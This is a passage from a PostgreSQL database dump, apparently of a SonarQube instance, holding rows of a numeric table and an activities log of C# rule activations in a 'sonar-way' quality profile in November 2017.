72	1	42	2	\N	1511453811333	1511453811333
73	1	80	2	\N	1511453811337	1511453811337
74	1	146	3	\N	1511453811340	1511453811340
75	1	128	3	\N	1511453811344	1511453811344
76	1	155	3	\N	1511453811347	1511453811347
77	1	124	4	\N	1511453811350	1511453811350
78	1	79	4	\N	1511453811353	1511453811353
79	1	50	2	\N	1511453811357	1511453811357
80	1	163	3	\N	1511453811360	1511453811360
81	1	85	4	\N	1511453811364	1511453811364
82	1	162	2	\N	1511453811368	1511453811368
83	1	102	3	\N	1511453811372	1511453811372
84	1	105	2	\N	1511453811375	1511453811375
85	1	56	3	\N	1511453811379	1511453811379
86	1	47	1	\N	1511453811383	1511453811383
87	1	18	2	\N	1511453811388	1511453811388
88	1	75	1	\N	1511453811392	1511453811392
89	1	43	2	\N	1511453811396	1511453811396
90	1	126	3	\N	1511453811400	1511453811400
91	1	62	3	\N	1511453811403	1511453811403
92	1	143	3	\N	1511453811407	1511453811407
93	1	165	3	\N	1511453811411	1511453811411
94	1	133	2	\N	1511453811415	1511453811415
95	1	38	3	\N	1511453811418	1511453811418
96	1	134	2	\N	1511453811422	1511453811422
97	1	81	3	\N	1511453811426	1511453811426
98	1	39	3	\N	1511453811430	1511453811430
99	1	111	2	\N	1511453811435	1511453811435
100	1	87	2	\N	1511453811439	1511453811439
101	1	83	3	\N	1511453811444	1511453811444
102	2	10	2	\N	1511453811464	1511453811464
103	2	7	2	\N	1511453811475	1511453811475
104	2	590	2	\N	1511453811494	1511453811494
105	2	495	2	\N	1511453811507	1511453811507
106	2	732	2	\N	1511453811517	1511453811517
107	2	723	2	\N	1511453811527	1511453811527
108	2	713	3	\N	1511453811537	1511453811537
109	2	589	1	\N	1511453811548	1511453811548
110	2	587	1	\N	1511453811560	1511453811560
111	2	762	1	\N	1511453811575	1511453811575
112	2	768	1	\N	1511453811581	1511453811581
113	2	766	1	\N	1511453811586	1511453811586
114	2	615	1	\N	1511453811589	1511453811589
115	2	756	1	\N	1511453811594	1511453811594
116	2	759	1	\N	1511453811597	1511453811597
117	2	748	1	\N	1511453811600	1511453811600
118	2	749	1	\N	1511453811604	1511453811604
119	2	686	2	\N	1511453811607	1511453811607
120	2	537	3	\N	1511453811610	1511453811610
121	2	431	2	\N	1511453811614	1511453811614
122	2	465	4	\N	1511453811620	1511453811620
123	2	469	2	\N	1511453811624	1511453811624
124	2	432	2	\N	1511453811627	1511453811627
125	2	601	2	\N	1511453811631	1511453811631
126	2	664	2	\N	1511453811635	1511453811635
127	2	416	1	\N	1511453811639	1511453811639
128	2	545	2	\N	1511453811643	1511453811643
129	2	689	1	\N	1511453811648	1511453811648
130	2	561	1	\N	1511453811652	1511453811652
131	2	562	2	\N	1511453811656	1511453811656
132	2	614	2	\N	1511453811659	1511453811659
133	2	760	0	\N	1511453811663	1511453811663
134	2	763	2	\N	1511453811666	1511453811666
135	2	765	0	\N	1511453811670	1511453811670
136	2	694	2	\N	1511453811673	1511453811673
137	2	757	2	\N	1511453811677	1511453811677
138	2	684	1	\N	1511453811680	1511453811680
139	2	680	1	\N	1511453811684	1511453811684
140	2	629	2	\N	1511453811689	1511453811689
141	2	724	2	\N	1511453811694	1511453811694
142	2	741	2	\N	1511453811698	1511453811698
143	2	729	4	\N	1511453811702	1511453811702
144	2	604	2	\N	1511453811706	1511453811706
145	2	602	2	\N	1511453811711	1511453811711
146	2	715	2	\N	1511453811715	1511453811715
147	2	641	2	\N	1511453811719	1511453811719
148	2	583	2	\N	1511453811723	1511453811723
149	2	640	1	\N	1511453811727	1511453811727
150	2	572	3	\N	1511453811730	1511453811730
151	2	526	2	\N	1511453811734	1511453811734
152	2	576	2	\N	1511453811737	1511453811737
153	2	626	2	\N	1511453811741	1511453811741
154	2	598	2	\N	1511453811744	1511453811744
155	2	608	4	\N	1511453811748	1511453811748
156	2	591	2	\N	1511453811751	1511453811751
157	2	609	2	\N	1511453811754	1511453811754
158	2	593	2	\N	1511453811758	1511453811758
159	2	588	2	\N	1511453811763	1511453811763
160	2	578	3	\N	1511453811767	1511453811767
161	2	488	2	\N	1511453811770	1511453811770
162	2	630	2	\N	1511453811775	1511453811775
163	2	489	2	\N	1511453811779	1511453811779
164	2	553	2	\N	1511453811782	1511453811782
165	2	622	2	\N	1511453811786	1511453811786
166	2	619	1	\N	1511453811790	1511453811790
167	2	652	2	\N	1511453811794	1511453811794
168	2	653	2	\N	1511453811797	1511453811797
169	2	599	1	\N	1511453811801	1511453811801
170	2	744	3	\N	1511453811804	1511453811804
171	2	496	1	\N	1511453811808	1511453811808
172	2	491	2	\N	1511453811811	1511453811811
173	2	490	1	\N	1511453811816	1511453811816
174	2	606	2	\N	1511453811820	1511453811820
175	2	446	2	\N	1511453811823	1511453811823
176	2	501	1	\N	1511453811827	1511453811827
177	2	437	1	\N	1511453811831	1511453811831
178	2	438	3	\N	1511453811834	1511453811834
179	2	505	2	\N	1511453811838	1511453811838
180	2	459	1	\N	1511453811841	1511453811841
181	2	413	2	\N	1511453811845	1511453811845
182	2	451	3	\N	1511453811849	1511453811849
183	2	405	4	\N	1511453811852	1511453811852
184	2	449	2	\N	1511453811855	1511453811855
185	2	524	1	\N	1511453811858	1511453811858
186	2	433	2	\N	1511453811861	1511453811861
187	2	428	3	\N	1511453811864	1511453811864
188	2	440	2	\N	1511453811868	1511453811868
189	2	424	2	\N	1511453811871	1511453811871
190	2	457	1	\N	1511453811875	1511453811875
191	2	414	3	\N	1511453811878	1511453811878
192	2	452	2	\N	1511453811882	1511453811882
193	2	663	2	\N	1511453811885	1511453811885
194	2	632	2	\N	1511453811888	1511453811888
195	2	422	2	\N	1511453811891	1511453811891
196	2	705	2	\N	1511453811894	1511453811894
197	2	419	2	\N	1511453811898	1511453811898
198	2	687	2	\N	1511453811901	1511453811901
199	2	463	1	\N	1511453811905	1511453811905
200	2	552	2	\N	1511453811909	1511453811909
201	2	448	3	\N	1511453811914	1511453811914
202	2	636	3	\N	1511453811917	1511453811917
203	2	681	1	\N	1511453811921	1511453811921
204	2	563	2	\N	1511453811925	1511453811925
205	2	647	1	\N	1511453811928	1511453811928
206	2	567	2	\N	1511453811932	1511453811932
207	2	662	2	\N	1511453811935	1511453811935
208	2	645	2	\N	1511453811938	1511453811938
209	2	718	2	\N	1511453811942	1511453811942
210	2	642	2	\N	1511453811946	1511453811946
211	2	594	2	\N	1511453811950	1511453811950
212	2	708	2	\N	1511453811954	1511453811954
213	2	649	1	\N	1511453811960	1511453811960
214	2	509	3	\N	1511453811964	1511453811964
215	2	722	3	\N	1511453811968	1511453811968
216	2	691	2	\N	1511453811972	1511453811972
217	2	486	3	\N	1511453811976	1511453811976
218	2	674	3	\N	1511453811980	1511453811980
219	2	519	3	\N	1511453811983	1511453811983
220	2	554	2	\N	1511453811986	1511453811986
221	2	510	2	\N	1511453811989	1511453811989
222	2	402	2	\N	1511453811992	1511453811992
223	2	660	2	\N	1511453811995	1511453811995
224	2	688	1	\N	1511453811998	1511453811998
225	2	738	3	\N	1511453812001	1511453812001
226	2	623	2	\N	1511453812004	1511453812004
227	2	532	3	\N	1511453812007	1511453812007
228	2	769	3	\N	1511453812011	1511453812011
229	2	728	3	\N	1511453812014	1511453812014
230	2	702	2	\N	1511453812017	1511453812017
231	2	400	3	\N	1511453812020	1511453812020
232	2	568	3	\N	1511453812023	1511453812023
233	2	739	3	\N	1511453812028	1511453812028
234	2	417	3	\N	1511453812032	1511453812032
235	2	543	3	\N	1511453812036	1511453812036
236	2	733	2	\N	1511453812040	1511453812040
237	2	569	4	\N	1511453812043	1511453812043
238	2	745	4	\N	1511453812046	1511453812046
239	2	564	4	\N	1511453812049	1511453812049
240	2	555	4	\N	1511453812052	1511453812052
241	2	574	3	\N	1511453812056	1511453812056
242	2	579	3	\N	1511453812059	1511453812059
243	2	559	3	\N	1511453812062	1511453812062
244	2	767	3	\N	1511453812065	1511453812065
245	2	734	3	\N	1511453812068	1511453812068
246	2	752	4	\N	1511453812071	1511453812071
247	2	611	3	\N	1511453812075	1511453812075
248	2	631	3	\N	1511453812077	1511453812077
249	2	624	3	\N	1511453812080	1511453812080
250	2	612	2	\N	1511453812083	1511453812083
251	2	627	3	\N	1511453812087	1511453812087
252	2	709	4	\N	1511453812090	1511453812090
253	2	475	3	\N	1511453812094	1511453812094
254	2	742	3	\N	1511453812097	1511453812097
255	2	635	3	\N	1511453812101	1511453812101
256	2	620	3	\N	1511453812104	1511453812104
257	2	613	4	\N	1511453812108	1511453812108
258	2	607	4	\N	1511453812111	1511453812111
259	2	633	4	\N	1511453812114	1511453812114
260	2	472	3	\N	1511453812117	1511453812117
261	2	716	3	\N	1511453812120	1511453812120
262	2	538	3	\N	1511453812123	1511453812123
263	2	541	1	\N	1511453812126	1511453812126
264	2	530	3	\N	1511453812129	1511453812129
265	2	473	2	\N	1511453812132	1511453812132
266	2	556	2	\N	1511453812136	1511453812136
267	2	506	2	\N	1511453812140	1511453812140
268	2	625	2	\N	1511453812143	1511453812143
269	2	692	2	\N	1511453812146	1511453812146
270	2	528	3	\N	1511453812149	1511453812149
271	2	504	3	\N	1511453812153	1511453812153
272	2	500	2	\N	1511453812156	1511453812156
273	2	603	4	\N	1511453812159	1511453812159
274	2	577	2	\N	1511453812162	1511453812162
275	2	474	3	\N	1511453812166	1511453812166
276	2	693	2	\N	1511453812169	1511453812169
277	2	575	2	\N	1511453812173	1511453812173
278	2	434	2	\N	1511453812176	1511453812176
279	2	726	3	\N	1511453812179	1511453812179
280	2	492	2	\N	1511453812182	1511453812182
281	2	508	3	\N	1511453812185	1511453812185
282	2	700	2	\N	1511453812188	1511453812188
283	2	704	3	\N	1511453812191	1511453812191
284	2	600	3	\N	1511453812194	1511453812194
285	2	580	2	\N	1511453812198	1511453812198
286	2	621	3	\N	1511453812202	1511453812202
287	2	703	2	\N	1511453812205	1511453812205
288	2	661	2	\N	1511453812208	1511453812208
289	2	436	2	\N	1511453812211	1511453812211
290	2	584	4	\N	1511453812214	1511453812214
291	2	755	4	\N	1511453812216	1511453812216
292	2	401	4	\N	1511453812228	1511453812228
293	2	678	3	\N	1511453812233	1511453812233
294	2	441	4	\N	1511453812238	1511453812238
295	2	618	2	\N	1511453812246	1511453812246
296	2	670	4	\N	1511453812250	1511453812250
297	2	730	2	\N	1511453812254	1511453812254
298	2	656	2	\N	1511453812257	1511453812257
299	2	461	2	\N	1511453812268	1511453812268
300	2	443	4	\N	1511453812273	1511453812273
301	2	651	2	\N	1511453812276	1511453812276
302	2	550	2	\N	1511453812280	1511453812280
303	2	669	3	\N	1511453812283	1511453812283
304	2	439	2	\N	1511453812286	1511453812286
305	2	444	3	\N	1511453812289	1511453812289
306	2	429	3	\N	1511453812293	1511453812293
307	2	758	3	\N	1511453812296	1511453812296
308	2	403	4	\N	1511453812300	1511453812300
309	2	531	2	\N	1511453812303	1511453812303
310	2	638	3	\N	1511453812305	1511453812305
311	2	721	2	\N	1511453812308	1511453812308
312	2	697	2	\N	1511453812311	1511453812311
313	2	731	1	\N	1511453812314	1511453812314
314	2	701	3	\N	1511453812317	1511453812317
315	2	480	2	\N	1511453812320	1511453812320
316	2	467	3	\N	1511453812324	1511453812324
317	2	536	1	\N	1511453812327	1511453812327
318	2	617	3	\N	1511453812331	1511453812331
319	2	566	2	\N	1511453812334	1511453812334
320	2	658	3	\N	1511453812338	1511453812338
321	2	468	2	\N	1511453812341	1511453812341
322	2	412	3	\N	1511453812344	1511453812344
323	2	650	2	\N	1511453812347	1511453812347
324	2	464	2	\N	1511453812350	1511453812350
325	2	582	2	\N	1511453812353	1511453812353
326	2	659	2	\N	1511453812356	1511453812356
327	2	399	2	\N	1511453812361	1511453812361
328	2	517	2	\N	1511453812366	1511453812366
329	2	471	2	\N	1511453812370	1511453812370
330	2	515	3	\N	1511453812373	1511453812373
331	2	546	2	\N	1511453812377	1511453812377
332	2	655	3	\N	1511453812381	1511453812381
333	2	539	3	\N	1511453812385	1511453812385
334	2	409	3	\N	1511453812389	1511453812389
335	2	482	1	\N	1511453812392	1511453812392
336	2	478	2	\N	1511453812395	1511453812395
337	2	548	2	\N	1511453812398	1511453812398
338	2	514	3	\N	1511453812402	1511453812402
339	2	666	2	\N	1511453812405	1511453812405
340	2	544	4	\N	1511453812409	1511453812409
341	2	527	2	\N	1511453812412	1511453812412
342	2	529	2	\N	1511453812415	1511453812415
343	2	644	2	\N	1511453812419	1511453812419
344	2	547	3	\N	1511453812422	1511453812422
345	2	542	3	\N	1511453812426	1511453812426
346	2	540	2	\N	1511453812430	1511453812430
347	2	610	3	\N	1511453812433	1511453812433
348	2	477	3	\N	1511453812438	1511453812438
349	2	596	2	\N	1511453812441	1511453812441
350	2	597	2	\N	1511453812444	1511453812444
351	2	679	2	\N	1511453812448	1511453812448
352	2	671	2	\N	1511453812451	1511453812451
353	2	511	2	\N	1511453812455	1511453812455
354	2	751	3	\N	1511453812459	1511453812459
355	2	657	3	\N	1511453812463	1511453812463
356	3	789	2	\N	1511453812489	1511453812489
357	3	826	2	\N	1511453812514	1511453812514
358	3	791	2	\N	1511453812528	1511453812528
359	3	865	1	\N	1511453812543	1511453812543
360	3	908	3	\N	1511453812554	1511453812554
361	3	874	2	\N	1511453812564	1511453812564
362	3	799	2	\N	1511453812577	1511453812577
363	3	883	4	\N	1511453812589	1511453812589
364	3	909	2	\N	1511453812599	1511453812599
365	3	901	2	\N	1511453812611	1511453812611
366	3	817	2	\N	1511453812615	1511453812615
367	3	822	2	\N	1511453812618	1511453812618
368	3	839	2	\N	1511453812621	1511453812621
369	3	856	3	\N	1511453812625	1511453812625
370	3	786	2	\N	1511453812629	1511453812629
371	3	886	3	\N	1511453812633	1511453812633
372	3	893	3	\N	1511453812637	1511453812637
373	3	820	3	\N	1511453812641	1511453812641
374	3	831	3	\N	1511453812645	1511453812645
375	3	879	2	\N	1511453812649	1511453812649
376	3	832	3	\N	1511453812659	1511453812659
377	3	872	3	\N	1511453812663	1511453812663
378	3	888	3	\N	1511453812667	1511453812667
379	3	846	2	\N	1511453812670	1511453812670
380	3	844	2	\N	1511453812674	1511453812674
381	3	795	3	\N	1511453812678	1511453812678
382	3	864	3	\N	1511453812681	1511453812681
383	3	827	2	\N	1511453812684	1511453812684
384	3	824	2	\N	1511453812688	1511453812688
385	3	902	2	\N	1511453812692	1511453812692
386	3	911	2	\N	1511453812698	1511453812698
387	3	892	1	\N	1511453812703	1511453812703
388	3	869	2	\N	1511453812707	1511453812707
389	3	884	3	\N	1511453812713	1511453812713
390	3	779	4	\N	1511453812718	1511453812718
391	3	875	3	\N	1511453812722	1511453812722
392	3	802	2	\N	1511453812727	1511453812727
393	3	852	2	\N	1511453812730	1511453812730
394	3	780	2	\N	1511453812734	1511453812734
395	3	870	3	\N	1511453812737	1511453812737
396	3	877	2	\N	1511453812740	1511453812740
397	3	890	3	\N	1511453812743	1511453812743
398	3	842	2	\N	1511453812747	1511453812746
399	3	867	3	\N	1511453812750	1511453812750
400	3	894	2	\N	1511453812753	1511453812753
401	3	847	2	\N	1511453812756	1511453812756
402	3	895	4	\N	1511453812759	1511453812759
403	3	876	3	\N	1511453812762	1511453812762
404	3	810	2	\N	1511453812771	1511453812771
405	3	808	2	\N	1511453812776	1511453812776
406	3	783	2	\N	1511453812779	1511453812779
407	3	889	3	\N	1511453812783	1511453812783
408	3	848	3	\N	1511453812786	1511453812786
409	3	797	3	\N	1511453812794	1511453812794
410	3	857	4	\N	1511453812798	1511453812798
411	3	849	2	\N	1511453812801	1511453812801
412	3	819	1	\N	1511453812804	1511453812804
413	3	837	2	\N	1511453812807	1511453812807
414	3	784	2	\N	1511453812811	1511453812811
415	3	828	3	\N	1511453812814	1511453812814
416	3	868	1	\N	1511453812817	1511453812817
417	3	904	2	\N	1511453812820	1511453812820
418	3	882	1	\N	1511453812823	1511453812823
419	3	887	0	\N	1511453812826	1511453812826
420	3	833	2	\N	1511453812830	1511453812830
421	3	823	2	\N	1511453812833	1511453812833
422	3	897	1	\N	1511453812836	1511453812836
423	3	804	2	\N	1511453812839	1511453812839
424	3	912	0	\N	1511453812843	1511453812843
425	3	777	3	\N	1511453812846	1511453812846
426	3	903	2	\N	1511453812849	1511453812849
427	3	898	2	\N	1511453812851	1511453812851
428	3	778	2	\N	1511453812855	1511453812855
429	3	825	3	\N	1511453812859	1511453812859
430	3	850	1	\N	1511453812863	1511453812863
431	3	793	3	\N	1511453812866	1511453812866
432	3	794	2	\N	1511453812871	1511453812871
433	3	863	2	\N	1511453812875	1511453812875
434	3	834	2	\N	1511453812880	1511453812880
435	3	790	4	\N	1511453812884	1511453812884
436	3	900	3	\N	1511453812887	1511453812887
437	3	805	3	\N	1511453812890	1511453812890
438	3	806	4	\N	1511453812895	1511453812895
439	3	907	2	\N	1511453812899	1511453812899
440	3	843	2	\N	1511453812902	1511453812902
441	3	798	2	\N	1511453812905	1511453812905
442	4	789	2	\N	1511453812932	1511453812932
443	4	826	2	\N	1511453812943	1511453812943
444	4	871	2	\N	1511453812953	1511453812953
445	4	908	3	\N	1511453812964	1511453812964
446	4	883	4	\N	1511453812976	1511453812976
447	4	901	2	\N	1511453812985	1511453812985
448	4	839	2	\N	1511453812994	1511453812994
449	4	856	3	\N	1511453813003	1511453813003
450	4	886	3	\N	1511453813012	1511453813012
451	4	893	3	\N	1511453813021	1511453813021
452	4	820	3	\N	1511453813025	1511453813025
453	4	831	3	\N	1511453813028	1511453813028
454	4	879	2	\N	1511453813032	1511453813032
455	4	832	3	\N	1511453813035	1511453813035
456	4	872	3	\N	1511453813038	1511453813038
457	4	888	3	\N	1511453813041	1511453813041
458	4	846	2	\N	1511453813044	1511453813044
459	4	864	3	\N	1511453813047	1511453813047
460	4	869	2	\N	1511453813050	1511453813050
461	4	884	3	\N	1511453813053	1511453813053
462	4	779	4	\N	1511453813058	1511453813058
463	4	780	2	\N	1511453813063	1511453813063
464	4	890	3	\N	1511453813067	1511453813067
465	4	842	2	\N	1511453813070	1511453813070
466	4	867	3	\N	1511453813074	1511453813074
467	4	899	3	\N	1511453813079	1511453813079
468	4	895	4	\N	1511453813083	1511453813083
469	4	876	3	\N	1511453813087	1511453813087
470	4	889	3	\N	1511453813091	1511453813091
471	4	857	4	\N	1511453813096	1511453813096
472	4	784	2	\N	1511453813100	1511453813100
473	4	828	3	\N	1511453813104	1511453813104
474	4	904	2	\N	1511453813107	1511453813107
475	4	812	4	\N	1511453813111	1511453813111
476	4	825	3	\N	1511453813115	1511453813115
477	4	790	4	\N	1511453813118	1511453813118
478	4	900	3	\N	1511453813122	1511453813122
479	4	805	3	\N	1511453813126	1511453813126
480	4	806	4	\N	1511453813130	1511453813130
481	4	798	2	\N	1511453813133	1511453813133
\.


--
-- TOC entry 2696 (class 0 OID 33464)
-- Dependencies: 262
-- Data for Name: activities; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) FROM stdin;
1	2017-11-23 16:16:50.955	\N	key=cs-sonar-way-15357:csharpsquid:S3244;ruleKey=csharpsquid:S3244;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquEHzJFC7L4qK5ZG
2	2017-11-23 16:16:50.971	\N	key=cs-sonar-way-15357:csharpsquid:S3236;ruleKey=csharpsquid:S3236;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquEbzJFC7L4qK5ZH
3	2017-11-23 16:16:50.989	\N	key=cs-sonar-way-15357:csharpsquid:S2306;ruleKey=csharpsquid:S2306;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquEtzJFC7L4qK5ZI
4	2017-11-23 16:16:50.999	\N	key=cs-sonar-way-15357:csharpsquid:S3168;ruleKey=csharpsquid:S3168;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquE3zJFC7L4qK5ZJ
5	2017-11-23 16:16:51.009	\N	key=cs-sonar-way-15357:csharpsquid:S1764;ruleKey=csharpsquid:S1764;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquFBzJFC7L4qK5ZK
6	2017-11-23 16:16:51.019	\N	key=cs-sonar-way-15357:csharpsquid:S1940;ruleKey=csharpsquid:S1940;profileKey=cs-sonar-way-15357;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquFLzJFC7L4qK5ZL
7	2017-11-23 16:16:51.03	\N	key=cs-sonar-way-15357:csharpsquid:S2486;ruleKey=csharpsquid:S2486;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquFWzJFC7L4qK5ZM
8	2017-11-23 16:16:51.041	\N	key=cs-sonar-way-15357:csharpsquid:S1118;ruleKey=csharpsquid:S1118;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquFhzJFC7L4qK5ZN
9	2017-11-23 16:16:51.058	\N	key=cs-sonar-way-15357:csharpsquid:S1155;ruleKey=csharpsquid:S1155;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquFyzJFC7L4qK5ZO
10	2017-11-23 16:16:51.067	\N	key=cs-sonar-way-15357:csharpsquid:S2971;ruleKey=csharpsquid:S2971;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquF6zJFC7L4qK5ZP
11	2017-11-23 16:16:51.077	\N	key=cs-sonar-way-15357:csharpsquid:S125;ruleKey=csharpsquid:S125;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquGFzJFC7L4qK5ZQ
12	2017-11-23 16:16:51.08	\N	key=cs-sonar-way-15357:csharpsquid:S1134;ruleKey=csharpsquid:S1134;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquGIzJFC7L4qK5ZR
13	2017-11-23 16:16:51.085	\N	key=cs-sonar-way-15357:csharpsquid:S1135;ruleKey=csharpsquid:S1135;profileKey=cs-sonar-way-15357;severity=INFO	QPROFILE	ACTIVATED	\N	AV_pquGNzJFC7L4qK5ZS
14	2017-11-23 16:16:51.089	\N	key=cs-sonar-way-15357:csharpsquid:S1862;ruleKey=csharpsquid:S1862;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquGRzJFC7L4qK5ZT
15	2017-11-23 16:16:51.094	\N	key=cs-sonar-way-15357:csharpsquid:S1871;ruleKey=csharpsquid:S1871;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquGWzJFC7L4qK5ZU
16	2017-11-23 16:16:51.113	\N	key=cs-sonar-way-15357:csharpsquid:S1699;ruleKey=csharpsquid:S1699;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquGpzJFC7L4qK5ZV
17	2017-11-23 16:16:51.126	\N	key=cs-sonar-way-15357:csharpsquid:S1854;ruleKey=csharpsquid:S1854;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquG2zJFC7L4qK5ZW
18	2017-11-23 16:16:51.13	\N	key=cs-sonar-way-15357:csharpsquid:S3172;ruleKey=csharpsquid:S3172;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquG6zJFC7L4qK5ZX
19	2017-11-23 16:16:51.134	\N	key=cs-sonar-way-15357:csharpsquid:S2930;ruleKey=csharpsquid:S2930;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquG-zJFC7L4qK5ZY
20	2017-11-23 16:16:51.138	\N	key=cs-sonar-way-15357:csharpsquid:S2997;ruleKey=csharpsquid:S2997;profileKey=cs-sonar-way-15357;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquHCzJFC7L4qK5ZZ
21	2017-11-23 16:16:51.142	\N	key=cs-sonar-way-15357:csharpsquid:S2953;ruleKey=csharpsquid:S2953;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquHGzJFC7L4qK5Za
22	2017-11-23 16:16:51.146	\N	key=cs-sonar-way-15357:csharpsquid:S108;ruleKey=csharpsquid:S108;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquHKzJFC7L4qK5Zb
23	2017-11-23 16:16:51.149	\N	key=cs-sonar-way-15357:csharpsquid:S1116;ruleKey=csharpsquid:S1116;profileKey=cs-sonar-way-15357;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquHNzJFC7L4qK5Zc
24	2017-11-23 16:16:51.153	\N	key=cs-sonar-way-15357:csharpsquid:S2291;ruleKey=csharpsquid:S2291;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquHRzJFC7L4qK5Zd
25	2017-11-23 16:16:51.157	\N	key=cs-sonar-way-15357:csharpsquid:S2344;ruleKey=csharpsquid:S2344;profileKey=cs-sonar-way-15357;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquHUzJFC7L4qK5Ze
26	2017-11-23 16:16:51.161	\N	key=cs-sonar-way-15357:csharpsquid:S1244;ruleKey=csharpsquid:S1244;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquHZzJFC7L4qK5Zf
27	2017-11-23 16:16:51.164	\N	key=cs-sonar-way-15357:csharpsquid:S2933;ruleKey=csharpsquid:S2933;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquHczJFC7L4qK5Zg
28	2017-11-23 16:16:51.168	\N	key=cs-sonar-way-15357:csharpsquid:S2345;ruleKey=csharpsquid:S2345;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquHgzJFC7L4qK5Zh
29	2017-11-23 16:16:51.171	\N	key=cs-sonar-way-15357:csharpsquid:S2346;ruleKey=csharpsquid:S2346;profileKey=cs-sonar-way-15357;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquHjzJFC7L4qK5Zi
30	2017-11-23 16:16:51.174	\N	key=cs-sonar-way-15357:csharpsquid:S3217;ruleKey=csharpsquid:S3217;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquHmzJFC7L4qK5Zj
31	2017-11-23 16:16:51.178	\N	key=cs-sonar-way-15357:csharpsquid:S3376;ruleKey=csharpsquid:S3376;profileKey=cs-sonar-way-15357;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquHqzJFC7L4qK5Zk
32	2017-11-23 16:16:51.182	\N	key=cs-sonar-way-15357:csharpsquid:S2934;ruleKey=csharpsquid:S2934;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquHuzJFC7L4qK5Zl
33	2017-11-23 16:16:51.185	\N	key=cs-sonar-way-15357:csharpsquid:S3246;ruleKey=csharpsquid:S3246;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquHxzJFC7L4qK5Zm
34	2017-11-23 16:16:51.189	\N	key=cs-sonar-way-15357:csharpsquid:S2326;ruleKey=csharpsquid:S2326;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquH1zJFC7L4qK5Zn
35	2017-11-23 16:16:51.192	\N	key=cs-sonar-way-15357:csharpsquid:S3249;ruleKey=csharpsquid:S3249;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquH4zJFC7L4qK5Zo
36	2017-11-23 16:16:51.196	\N	key=cs-sonar-way-15357:csharpsquid:S2328;ruleKey=csharpsquid:S2328;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquH8zJFC7L4qK5Zp
37	2017-11-23 16:16:51.199	\N	key=cs-sonar-way-15357:csharpsquid:S2219;ruleKey=csharpsquid:S2219;profileKey=cs-sonar-way-15357;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquH_zJFC7L4qK5Zq
38	2017-11-23 16:16:51.202	\N	key=cs-sonar-way-15357:csharpsquid:S907;ruleKey=csharpsquid:S907;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquICzJFC7L4qK5Zr
39	2017-11-23 16:16:51.208	\N	key=cs-sonar-way-15357:csharpsquid:S3397;ruleKey=csharpsquid:S3397;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquIIzJFC7L4qK5Zs
40	2017-11-23 16:16:51.212	\N	key=cs-sonar-way-15357:csharpsquid:S1066;ruleKey=csharpsquid:S1066;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquIMzJFC7L4qK5Zt
41	2017-11-23 16:16:51.216	\N	key=cs-sonar-way-15357:csharpsquid:S1145;ruleKey=csharpsquid:S1145;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquIQzJFC7L4qK5Zu
42	2017-11-23 16:16:51.219	\N	key=cs-sonar-way-15357:csharpsquid:S2692;ruleKey=csharpsquid:S2692;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquITzJFC7L4qK5Zv
